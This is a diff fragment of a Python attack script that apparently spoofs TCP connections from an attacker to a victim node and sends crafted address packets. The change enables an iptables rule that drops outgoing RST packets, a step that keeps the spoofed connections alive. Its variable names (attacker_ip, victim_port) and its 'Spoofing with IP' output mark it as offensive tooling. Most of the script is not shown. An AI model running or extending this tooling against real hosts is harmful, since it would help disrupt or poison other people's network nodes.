@@ -88,9 +88,6 @@ def addr_packet(str_addrs):
 	return msg
 
 def initialize_fake_connection(src_ip, dst_ip):
-	########## Skip changing to a random IP, just port :(
-	#src_ip = attacker_ip
-	##########
 	src_port = attacker_port
 	dst_port = victim_port
 	print(f'Spoofing with IP ({src_ip} : {src_port}) to IP ({dst_ip} : {dst_port})...')
@@ -257,7 +254,7 @@ if __name__ == '__main__':
 	backup_iptables()
 
 	#terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {victim_ip} -dport {victim_port} -j DROP')
-	#terminal('sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP')
+	terminal('sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP')
 	# Make the spoofing IP up
 	#terminal('sudo iptables -A INPUT -m state --state NEW ! -i wlan0 -j ACCEPT')
 	#terminal('sudo ifconfig wlan0 up')
